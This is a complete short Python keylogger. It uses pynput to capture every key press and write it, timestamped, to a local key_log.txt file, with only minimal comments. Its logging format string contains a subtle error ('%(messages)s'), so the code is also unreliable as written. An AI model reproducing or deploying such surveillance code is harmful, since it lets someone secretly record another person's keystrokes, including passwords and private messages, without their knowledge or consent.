#library
from pynput.keyboard import Key, Listener
import logging

#make a log file
log_dir = ""

#logging function
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(messages)s:') 

#logs using the library
def on_press(key):
    logging.info(str(key))

#listens    
with Listener(on_press=on_press) as listener:
    listener.join()
